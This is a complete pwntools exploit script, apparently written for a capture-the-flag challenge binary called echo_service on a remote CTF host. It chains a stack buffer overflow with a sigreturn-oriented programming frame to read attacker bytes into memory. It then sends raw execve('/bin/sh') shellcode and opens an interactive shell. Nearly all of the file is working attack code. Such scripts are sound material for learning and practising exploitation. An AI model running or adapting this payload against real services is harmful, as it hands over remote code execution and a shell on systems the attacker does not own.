import argparse
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

# cmdline argument - how to connect to binary
parser = argparse.ArgumentParser()
parser.add_argument("--local", help="Run exploit locally", action="store_true")
parser.add_argument("--attach", help="Run exploit locally and attach debugger", action="store_true")
parser.add_argument("--remote", help="Run exploit on remote service", action="store_true")
parser.add_argument("--ssh", help="Run exploit on SSH server", action="store_true")
args = parser.parse_args()

# GDB commands
gdb_cmd = [
	"b *0x4000fe",
	# 'b *0x600000',
	"c"
]

# Binary names
bin_fname = './echo_service'
libc_fname = ''

# Remote
IP = 'university.opentoallctf.com'
PORT = 30007

# SSH
URL = ''
username = ''
password = ''
bin_abs_path = ''

# Create ELF objects
e = ELF(bin_fname)
libc = ELF(libc_fname) if libc_fname else None
x64 = e.bits != 32
context.arch = 'amd64'	# must be here or pwntools will give an error when using SigreturnFrame

# Command line args
# e.g. arg1 = cyclic_find('ahaa') * 'a' + '\xbd\x86\x04\x08' + 'a' * 4 + p32(next(e.search('/bin/sh')))
arg1 = ''
proc_args = [bin_fname, arg1]

if args.remote:
	p = remote(IP, PORT)
elif args.local or args.attach:
	p = process(proc_args, env={"LD_PRELOAD" : libc_fname}) if libc_fname else process(proc_args)
	if args.attach:
		gdb.attach(p, gdbscript="\n".join(gdb_cmd))
elif args.ssh:
	s = ssh(host=URL, user=username, password=password)
	s.set_working_directory(bin_abs_path)
	p = s.process(proc_args)
else:
	p = gdb.debug(proc_args, gdbscript="\n".join(gdb_cmd), env={"LD_PRELOAD" : libc_fname}) if libc_fname else gdb.debug(proc_args, gdbscript="\n".join(gdb_cmd))
	p.recvline() # Read "Remote debugging from 127.0.0.1" string

"""
	Exploit

	Examples:
	func_offset = libc.symbols['puts'] 	# Offset in libc
	puts_addr = p32(e.got['puts'])
	main = e.symbols['main']
	addr_string = next(e.search('/bin/cat flag.txt'))
"""

sys_ret = 0x4000fe

# Overflow to read, then call arbitrary syscalls
buf = 'a' * 32
buf += p64(0x400105)
buf += 'b' * 0x20
buf += p64(sys_ret)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = 0x600000
sigframe.rdx = 0x400
sigframe.rsp = 0x600000 + 30 + 8 # Shellcode + /bin/sh\x00
sigframe.rip = sys_ret

buf += str(sigframe)
p.send(buf)

pause(1)

# Send 15 bytes to call sigreturn
buf = 'a' * 15
p.send(buf)

pause(1)

# Send shellcode
# shellcode  = '48 c7 c0 3b 00 00 00' #    mov    rax,0x3b
# shellcode += '48 c7 c7 1e 00 60 00' #    mov    rdi,0x60001e
# shellcode += '48 c7 c2 00 00 00 00' #    mov    rdx,0x0
# shellcode += '48 c7 c6 00 00 00 00' #    mov    rsi,0x0
# shellcode += '0f 05' #                   syscall
shellcode = "\x48\xC7\xC0\x3B\x00\x00\x00\x48\xC7\xC7\x1e\x00\x60\x00\x48\xC7\xC2\x00\x00\x00\x00\x48\xC7\xC6\x00\x00\x00\x00\x0F\x05"
shellcode += '/bin/sh\x00'
shellcode += p64(0x600000) # return address
p.send(shellcode)

p.interactive()
